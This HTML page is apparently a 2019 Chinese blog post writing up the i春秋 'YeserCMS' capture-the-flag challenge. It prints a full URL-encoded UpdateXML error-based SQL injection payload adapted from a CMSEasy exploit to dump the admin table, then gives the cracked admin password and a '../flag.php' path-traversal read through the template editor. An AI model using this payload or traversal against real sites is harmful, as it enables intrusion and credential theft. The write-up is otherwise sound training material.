@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+  <!-- Html Head Tag-->
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content>
+  <meta name="author" content="gelinlang">
+  <!-- Open Graph Data -->
+  <meta property="og:title" content="YeserCMS">
+  <meta property="og:description" content="路漫漫求修远兮，我将上下而求索">
+  <meta property="og:site_name" content="gelinlang&#39;s Blog">
+  <meta property="og:type" content="article">
+  <meta property="og:image" content="http://gelinlang.cn">
+  
+    <link rel="alternate" href="/atom.xml" title="gelinlang&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+
+  <!-- Site Title -->
+  <title>gelinlang's Blog</title>
+
+  <!-- Bootstrap CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.min.css">
+  <!-- Custom CSS -->
+  
+  <link rel="stylesheet" href="/css/style.light.css">
+
+  <!-- Google Analytics -->
+  
+
+</head>
+
+  <body>
+    <!-- Page Header -->
+
+
+<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="page-title with-background-image">
+          <p class="title">YeserCMS</p>
+          <p class="subtitle"></p>
+        </div>
+        <div class="site-menu with-background-image">
+          <ul>
+            
+              <li>
+                <a href="/">
+                  
+                  Home
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  
+                  Archives
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/tags/">
+                  
+                  tags
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/">
+                  
+                  categories
+                  
+                </a>
+              </li>
+            
+              <li>
+                <a href="/gelinlang@163.com">
+                  
+                  Email
+                  
+                </a>
+              </li>
+            
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</header>
+
+<article>
+  <div class="container typo">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <div class="post-info text-muted">
+          
+            <!-- Author -->
+            <span class="author info">By gelinlang</span>
+          
+          <!-- Date -->
+          <span class="date-time info">On
+            <span class="date">2019-04-23</span>
+            <span class="time">22:04:13</span>
+          </span>
+          
+          <!--  Categories  -->
+            <span class="categories info">Under 
+
+<a href="/categories/CTF/">CTF</a>
+</span>
+          
+        </div>
+        <!-- Tags -->
+        
+        <!-- Post Main Content -->
+        <div class="post-content">
+          <p>i春秋上的一道题，做个记录。说新的CMS系统，帮忙测测是否有漏洞。tips，flag在网站根目录下。<br>访问flag，显示flag_is_here。<br><a id="more"></a><br>通常思路如下：<br>第一步，判断CMS类型。<br>第二步，查询CMS可以利用的漏洞。<br>第三步，通过漏洞得到管理员账号，登陆后台<br>第四步，上传一句话getshell。</p>
+<p>浏览了网站，发现没有标志什么CMS，将它右上角的“手机版 - 购物车 - 留言 - 繁体 - 注册 / 登陆”，去搜索，可以找到一堆一样结构的网站。有些标注了使用的CMS。<br><img src="https://upload-images.jianshu.io/upload_images/16514845-b814e946b83bc864.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>搜索下cmseasy的漏洞<br><img src="https://upload-images.jianshu.io/upload_images/16514845-79f3284fb483b501.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p>这个cmseasy 无限制报错注入可以利用，稍微修改下原payload，将cmseasy_user改为yesercms_name，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt;&lt;q&gt;detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat%2528username%252C%2527%257C%2527%252Cpassword%2529%2529%2520from%2520yesercms_user%2529%252C1%252C32%2529%252C0x5d%2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520&lt;/q&gt;&lt;/xjxquery&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后在<a href="http://7d919462dc574d2e85bcd0bf0654734366f837cda98349ad.changame.ichunqiu.com/celive/live/header.php页面，post以上数据。得到admin和密文（一次显示不全，调整一下即可），为admin|ff512d4240cbbdeafada404677ccbe61，将其MD5解密，得到密码为yeser231。" target="_blank" rel="noopener">http://7d919462dc574d2e85bcd0bf0654734366f837cda98349ad.changame.ichunqiu.com/celive/live/header.php页面，post以上数据。得到admin和密文（一次显示不全，调整一下即可），为admin|ff512d4240cbbdeafada404677ccbe61，将其MD5解密，得到密码为yeser231。</a><br>扫描目录，得到后台，登录。<br>开始找上传点，，好像没有。</p>
+<p>原来有个文件读取漏洞，在模板文件是直接被读取的，随便编辑一个，抓包，将id改为flag.php , ../flag.php , ../../flag.php读取到flag。<br>好像一般在模板处都有可利用的。</p>
+<p>总结：利用搜索引擎得到信息，查询可利用的漏洞。</p>
+
+        </div>
+      </div>
+    </div>
+  </div>
+</article>
+
+
+
+    <!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <p class="copyright text-muted">
+          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
+          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
+        </p><p class="copyright text-muted">
+          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
+        </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+    <!-- After Footer Scripts -->
+<script src="/js/highlight.pack.js"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function(event) {
+    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
+    codeBlocks.forEach(function(block, index) {
+      hljs.highlightBlock(block);
+    });
+  });
+</script>
+
+  </body>
+</html>
+
